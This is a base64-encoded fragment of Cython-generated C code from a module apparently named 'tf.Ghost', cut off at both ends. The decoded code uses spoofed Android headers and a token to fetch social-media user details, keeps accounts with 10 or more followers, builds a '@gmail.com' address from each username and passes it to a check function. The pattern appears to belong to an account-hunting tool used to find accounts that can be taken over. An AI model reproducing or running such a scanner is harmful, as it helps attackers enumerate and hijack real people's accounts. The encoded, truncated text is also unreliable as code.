fbl91X2dldCk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDQxMSwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogICAgICBfX3B5eF90XzggPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTldLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgNDExLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICBfX3B5eF92X3VzZXJuYW1lID0gX19weXhfdF84OwogICAgICBfX3B5eF90XzggPSAwOwoKICAgICAgCiAgICAgIF9fcHl4X3RfMTMgPSBfX1B5eF9QeU9iamVjdF9Jc1RydWUoX19weXhfdl91c2VybmFtZSk7IGlmICh1bmxpa2VseSgoX19weXhfdF8xMyA8IDApKSkgX19QWVhfRVJSKDAsIDQxMywgX19weXhfTDNfZXJyb3IpCiAgICAgIGlmIChfX3B5eF90XzEzKSB7CgogICAgICAgIAogICAgICAgIF9fcHl4X3RfOCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdl9zZWxmLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaW5mb2luc3RhKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgNDE0LCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTsKICAgICAgICBpZiAodW5saWtlbHkoKFB5T2JqZWN0X1NldEl0ZW0oX19weXhfdF84LCBfX3B5eF92X3VzZXJuYW1lLCBfX3B5eF92X3VzZXJfaW5mbykgPCAwKSkpIF9fUFlYX0VSUigwLCA0MTQsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwoKICAgICAgICAKICAgICAgICBfX3B5eF90XzggPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3ZfdXNlcl9pbmZvLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2V0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgNDE1LCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTsKICAgICAgICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfOCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbNl0sIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCA0MTUsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgICAgIF9fcHl4X3RfOCA9IF9fUHl4X1B5TnVtYmVyX0ludChfX3B5eF90XzcpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCA0MTUsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICAgIF9fcHl4X3ZfZm9sbG93ZXJfY291bnQgPSAoKFB5T2JqZWN0KilfX3B5eF90XzgpOwogICAgICAgIF9fcHl4X3RfOCA9IDA7CgogICAgICAgIAogICAgICAgIF9fcHl4X3RfOCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdl91c2VyX2luZm8sIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZXQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCA0MTYsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpOwogICAgICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF84LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxMV0sIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCA0MTYsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgICAgIF9fcHl4X3RfOCA9IF9fUHl4X1B5TnVtYmVyX0ludChfX3B5eF90XzcpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCA0MTYsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICAgIF9fcHl4X3ZfbWVkaWFfY291bnQgPSAoKFB5T2JqZWN0KilfX3B5eF90XzgpOwogICAgICAgIF9fcHl4X3RfOCA9IDA7CgogICAgICAgIAogICAgICAgIF9fcHl4X3RfMTQgPSAoX19QeXhfUHlTZXF1ZW5jZV9Db250YWluc1RGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9fMTAsIF9fcHl4X3ZfdXNlcm5hbWUsIFB5X05FKSk7IGlmICh1bmxpa2VseSgoX19weXhfdF8xNCA8IDApKSkgX19QWVhfRVJSKDAsIDQxOCwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgaWYgKF9fcHl4X3RfMTQpIHsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgX19weXhfdF8xMyA9IF9fcHl4X3RfMTQ7CiAgICAgICAgICBnb3RvIF9fcHl4X0wxMV9ib29sX2Jpbm9wX2RvbmU7CiAgICAgICAgfQogICAgICAgIF9fcHl4X3RfOCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X3ZfZm9sbG93ZXJfY291bnQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xMCwgUHlfR0UpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfOCk7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDQxOCwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19weXhfdF8xNCA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzgpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfMTQgPCAwKSkpIF9fUFlYX0VSUigwLCA0MTgsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgICAgIGlmIChfX3B5eF90XzE0KSB7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgIF9fcHl4X3RfMTMgPSBfX3B5eF90XzE0OwogICAgICAgICAgZ290byBfX3B5eF9MMTFfYm9vbF9iaW5vcF9kb25lOwogICAgICAgIH0KICAgICAgICBfX3B5eF90XzggPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF92X21lZGlhX2NvdW50LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMCwgUHlfR0UpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfOCk7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDQxOCwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19weXhfdF8xNCA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzgpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfMTQgPCAwKSkpIF9fUFlYX0VSUigwLCA0MTgsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgICAgIF9fcHl4X3RfMTMgPSBfX3B5eF90XzE0OwogICAgICAgIF9fcHl4X0wxMV9ib29sX2Jpbm9wX2RvbmU6OwogICAgICAgIGlmIChfX3B5eF90XzEzKSB7CgogICAgICAgICAgCiAgICAgICAgICBfX3B5eF90XzggPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdl91c2VybmFtZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDQxOSwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTsKICAgICAgICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5VW5pY29kZV9Db25jYXRJblBsYWNlKF9fcHl4X3RfOCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9nbWFpbF9jb20pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCA0MTksIF9fcHl4X0wzX2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDsKICAgICAgICAgIF9fcHl4X3ZfZW1haWwgPSAoKFB5T2JqZWN0KilfX3B5eF90XzcpOwogICAgICAgICAgX19weXhfdF83ID0gMDsKCiAgICAgICAgICAKICAgICAgICAgIF9fcHl4X3RfOCA9IF9fcHl4X3Zfc2VsZjsKICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzgpOwogICAgICAgICAgX19weXhfdF8zID0gMDsKICAgICAgICAgIHsKICAgICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfOCwgX19weXhfdl9lbWFpbH07CiAgICAgICAgICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jaGVjaywgX19weXhfY2FsbGFyZ3MrX19weXhfdF8zLCAoMi1fX3B5eF90XzMpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgNDIwLCBfX3B5eF9MM19lcnJvcikKICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgICAgICAgICB9CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKCiAgICAgICAgICAKICAgICAgICB9CgogICAgICAgIAogICAgICB9CgogICAgICAKICAgIH0KICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgIGdvdG8gX19weXhfTDhfdHJ5X2VuZDsKICAgIF9fcHl4X0wzX2Vycm9yOjsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEyKTsgX19weXhfdF8xMiA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CgogICAgCiAgICBfX3B5eF90XzE1ID0gX19QeXhfUHlFcnJfRXhjZXB0aW9uTWF0Y2hlcygoKFB5T2JqZWN0ICopKCgoUHlUeXBlT2JqZWN0KilQeUV4Y19FeGNlcHRpb24pKSkpOwogICAgaWYgKF9fcHl4X3RfMTUpIHsKICAgICAgX19QeXhfQWRkVHJhY2ViYWNrKCJ0Zi5HaG9zdC5zY2FubmVyX3dvcmtlciIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpOwogICAgICBpZiAoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzcsICZfX3B5eF90XzgsICZfX3B5eF90XzEyKSA8IDApIF9fUFlYX0VSUigwLCA0MjIsIF9fcHl4X0w1X2V4Y2VwdF9lcnJvcikKICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzcpOwogICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfOCk7CiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xMik7CiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzgpOwogICAgICBfX3B5eF92X2UgPSBfX3B5eF90Xzg7CiAgICAgICB7CiAgICAgIH0KICAgICAgIHsKICAgICAgICB7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdl9lKTsgX19weXhfdl9lID0gMDsKICAgICAgICAgIGdvdG8gX19weXhfTDIwOwogICAgICAgIH0KICAgICAgICBfX3B5eF9MMjA6OwogICAgICB9CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDsKICAgICAgZ290byBfX3B5eF9MNF9leGNlcHRpb25faGFuZGxlZDsKICAgIH0KICAgIGdvdG8gX19weXhfTDVfZXhjZXB0X2Vycm9yOwoKICAgIAogICAgX19weXhfTDVfZXhjZXB0X2Vycm9yOjsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNCk7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzUpOwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF82KTsKICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfNCwgX19weXhfdF81LCBfX3B5eF90XzYpOwogICAgZ290byBfX3B5eF9MMV9lcnJvcjsKICAgIF9fcHl4X0w0X2V4Y2VwdGlvbl9oYW5kbGVkOjsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNCk7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzUpOwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF82KTsKICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfNCwgX19weXhfdF81LCBfX3B5eF90XzYpOwogICAgX19weXhfTDhfdHJ5X2VuZDo7CiAgfQoKICAKCiAgCiAgX19weXhfciA9IFB5X05vbmU7IF9fUHl4X0lOQ1JFRihQeV9Ob25lKTsKICBnb3RvIF9fcHl4X0wwOwogIF9fcHl4X0wxX2Vycm9yOjsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTIpOwogIF9fUHl4X0FkZFRyYWNlYmFjaygidGYuR2hvc3Quc2Nhbm5lcl93b3JrZXIiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICBfX3B5eF9yID0gTlVMTDsKICBfX3B5eF9MMDo7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X3VzZXJfaWQpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9tb2RlbF9udW1iZXIpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9hbmRyb2lkX3ZlcnNpb24pOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9kcGkpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9yZXNvbHV0aW9uKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfYnJhbmQpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9idWlsZF9zdWZmaXgpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl91c2VyX2FnZW50KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfbHNkX3Rva2VuKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfaGVhZGVycyk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2RhdGEpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9yZXNwb25zZSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X3VzZXJfaW5mbyk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X3VzZXJuYW1lKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfZm9sbG93ZXJfY291bnQpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9tZWRpYV9jb3VudCk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2VtYWlsKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfZSk7CiAgX19QeXhfWEdJVkVSRUYoX19weXhfcik7CiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIF9fcHl4X3I7Cn0KCgoKCnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMnRmXzVHaG9zdF8yN2NyZWF0ZV9kYXNoYm9hcmQoUHlPYmplY3QgKl9fcHl4X3NlbGYsIAojaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwKUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9hcmdzLCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkcwojZWxzZQpQeU9iamVjdCAqX19weXhfYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHMKI2VuZGlmCik7IApzdGF0aWMgUHlNZXRob2REZWYgX19weXhfbWRlZl8ydGZfNUdob3N0XzI3Y3JlYXRlX2Rhc2hib2FyZCA9IHsiY3JlYXRlX2Rhc2hib2FyZCIsIChQeUNGdW5jdGlvbikodm9pZCgqKSh2b2lkKSkoX19QeXhfUHlDRnVuY3Rpb25fRmFzdENhbGxXaXRoS2V5d29yZHMpX19weXhfcHdfMnRmXzVHaG9zdF8yN2NyZWF0ZV9kYXNoYm9hcmQsIF9fUHl4X01FVEhfRkFTVENBTEx8TUVUSF9LRVlXT1JEUywgMH07CnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMnRmXzVHaG9zdF8yN2NyZWF0ZV9kYXNoYm9hcmQoUHlPYmplY3QgKl9fcHl4X3NlbGYsIAojaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwKUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9hcmdzLCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkcwojZWxzZQpQeU9iamVjdCAqX19weXhfYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHMKI2VuZGlmCikgewogIFB5T2JqZWN0ICpfX3B5eF92X3NlbGYgPSAwOwogICNpZiAhQ1lUSE9OX01FVEhfRkFTVENBTEwKICBDWVRIT05fVU5VU0VEIFB5X3NzaXplX3QgX19weXhfbmFyZ3M7CiAgI2VuZGlmCiAgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqY29uc3QgKl9fcHl4X2t3dmFsdWVzOwogIFB5T2JqZWN0KiB2YWx1ZXNbMV0gPSB7MH07CiAgaW50IF9fcHl4X2xpbmVubyA9IDA7CiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMOwogIGludCBfX3B5eF9jbGluZW5vID0gMDsKICBQeU9iamVjdCAqX19weXhfciA9IDA7CiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnMKICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiY3JlYXRlX2Rhc2hib2FyZCAod3JhcHBlcikiLCAwKTsKICAjaWYgIUNZVEhPTl9NRVRIX0ZBU1RDQUxMCiAgI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFCiAgX19weXhfbmFyZ3MgPSBQeVR1cGxlX0dFVF9TSVpFKF9fcHl4X2FyZ3MpOwogICNlbHNlCiAgX19weXhfbmFyZ3MgPSBQeVR1cGxlX1NpemUoX19weXhfYXJncyk7IGlmICh1bmxpa2VseShfX3B5eF9uYXJncyA8IDApKSByZXR1cm4gTlVMTDsKICAjZW5kaWYKICAjZW5kaWYKICBfX3B5eF9rd3ZhbHVlcyA9IF9fUHl4X0t3VmFsdWVzX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIF9fcHl4X25hcmdzKTsKICB7CiAgICBQeU9iamVjdCAqKiBjb25zdCBfX3B5eF9weWFyZ25hbWVzW10gPSB7Jl9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zZWxmLDB9OwogICAgY29uc3QgUHlfc3NpemVfdCBfX3B5eF9rd2RzX2xlbiA9IChfX3B5eF9rd2RzKSA/IF9fUHl4X051bUt3YXJnc19GQVNUQ0FMTChfX3B5eF9rd2RzKSA6IDA7CiAgICBpZiAodW5saWtlbHkoX19weXhfa3dkc19sZW4pIDwgMCkgX19QWVhfRVJSKDAsIDQyNSwgX19weXhfTDNfZXJyb3IpCiAgICBpZiAoX19weXhfa3dkc19sZW4gPiAwKSB7CiAgICAgIHN3aXRjaCAoX19weXhfbmFyZ3MpIHsKICAgICAgICBjYXNlICAxOgogICAgICAgIHZhbHVlc1swXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAwKTsKICAgICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1swXSkpIF9fUFlYX0VSUigwLCA0MjUsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDsKICAgICAgICBjYXNlICAwOiBicmVhazsKICAgICAgICBkZWZhdWx0OiBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yOwogICAgICB9CiAgICAgIGNvbnN0IFB5X3NzaXplX3Qga3dkX3Bvc19hcmdzID0gX19weXhfbmFyZ3M7CiAgICAgIGlmIChfX1B5eF9QYXJzZUtleXdvcmRzKF9fcHl4X2t3ZHMsIF9fcHl4X2t3dmFsdWVzLCBfX3B5eF9weWFyZ25hbWVzLCAwLCB2YWx1ZXMsIGt3ZF9wb3NfYXJncywgX19weXhfa3dkc19sZW4sICJjcmVhdGVfZGFzaGJvYXJkIiwgMCkgPCAoMCkpIF9fUFlYX0VSUigwLCA0MjUsIF9fcHl4X0wzX2Vycm9yKQogICAgICBmb3IgKFB5X3NzaXplX3QgaSA9IF9fcHl4X25hcmdzOyBpIDwgMTsgaSsrKSB7CiAgICAgICAgaWYgKHVubGlrZWx5KCF2YWx1ZXNbaV0pKSB7IF9fUHl4X1JhaXNlQXJndHVwbGVJbnZhbGlkKCJjcmVhdGVfZGFzaGJvYXJkIiwgMSwgMSwgMSwgaSk7IF9fUFlYX0VSUigwLCA0MjUsIF9fcHl4X0wzX2Vycm9yKSB9CiAgICAgIH0KICAgIH0gZWxzZSBpZiAodW5saWtlbHkoX19weXhfbmFyZ3MgIT0gMSkpIHsKICAgICAgZ290byBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjsKICAgIH0gZWxzZSB7CiAgICAgIHZhbHVlc1swXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAwKTsKICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5KCF2YWx1ZXNbMF0pKSBfX1BZWF9FUlIoMCwgNDI1LCBfX3B5eF9MM19lcnJvcikKICAgIH0KICAgIF9fcHl4X3Zfc2VsZiA9IHZhbHVlc1swXTsKICB9CiAgZ290byBfX3B5eF9MNl9za2lwOwogIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yOjsKICBfX1B5eF9SYWlzZUFyZ3R1cGxlSW52YWxpZCgiY3JlYXRlX2Rhc2hib2FyZCIsIDEsIDEsIDEsIF9fcHl4X25hcmdzKTsgX19QWVhfRVJSKDAsIDQyNSwgX19weXhfTDNfZXJyb3IpCiAgX19weXhfTDZfc2tpcDo7CiAgZ290byBfX3B5eF9MNF9hcmd1bWVudF91bnBhY2tpbmdfZG9uZTsKICBfX3B5eF9MM19lcnJvcjo7CiAgZm9yIChQeV9zc2l6ZV90IF9fcHl4X3RlbXA9MDsgX19weXhfdGVtcCA8IChQeV9zc2l6ZV90KShzaXplb2YodmFsdWVzKS9zaXplb2YodmFsdWVzWzBdKSk7ICsrX19weXhfdGVtcCkgewogICAgUHlfWERFQ1JFRih2YWx1ZXNbX19weXhfdGVtcF0pOwogIH0KICBfX1B5eF9BZGRUcmFjZWJhY2soInRmLkdob3N0LmNyZWF0ZV9kYXNoYm9hcmQiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gTlVMTDsKICBfX3B5eF9MNF9hcmd1bWVudF91bnBhY2tpbmdfZG9uZTo7CiAgX19weXhfciA9IF9fcHl4X3BmXzJ0Zl81R2hvc3RfMjZjcmVhdGVfZGFzaGJvYXJkKF9fcHl4X3NlbGYsIF9fcHl4X3Zfc2VsZik7CgogIAogIGZvciAoUHlfc3NpemVfdCBfX3B5eF90ZW1wPTA7IF9fcHl4X3RlbXAgPCAoUHlfc3NpemVfdCkoc2l6ZW9mKHZhbHVlcykvc2l6ZW9mKHZhbHVlc1swXSkpOyArK19fcHl4X3RlbXApIHsKICAgIFB5X1hERUNSRUYodmFsdWVzW19fcHl4X3RlbXBdKTsKICB9CiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIF9fcHl4X3I7Cn0KCnN0YXRpYyBQeU9iamVjdCAqX19weXhfcGZfMnRmXzVHaG9zdF8yNmNyZWF0ZV9kYXNoYm9hcmQoQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfc2VsZiwgUHlPYmplY3QgKl9fcHl4X3Zfc2VsZikgewogIFB5T2JqZWN0ICpfX3B5eF9yID0gTlVMTDsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogIFB5T2JqZWN0ICpfX3B5eF90XzEgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzIgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzMgPSBOVUxMOwogIHNpemVfdCBfX3B5eF90XzQ7CiAgUHlPYmplY3QgKl9fcHl4X3RfNSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfNiA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfNyA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfOCA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfOVs2XTsKICBpbnQgX19weXhfbGluZW5vID0gMDsKICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7CiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwOwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJjcmVhdGVfZGFzaGJvYXJkIiwgMCk7CgogIAogIF9fcHl4X3RfMiA9IE5VTEw7CiAgX19QeXhfSU5DUkVGKF9fcHl4X2J1aWx0aW5fcHJpbnQpOwogIF9fcHl4X3RfMyA9IF9fcHl4X2J1aWx0aW5fcHJpbnQ7IAogIF9fcHl4X3RfNCA9IDE7CiAgewogICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9TVEFUU307CiAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzMsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNCwgKDItX19weXhfdF80KSB8IChfX3B5eF90XzQqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICBfX1B5eF9YREVDUkVG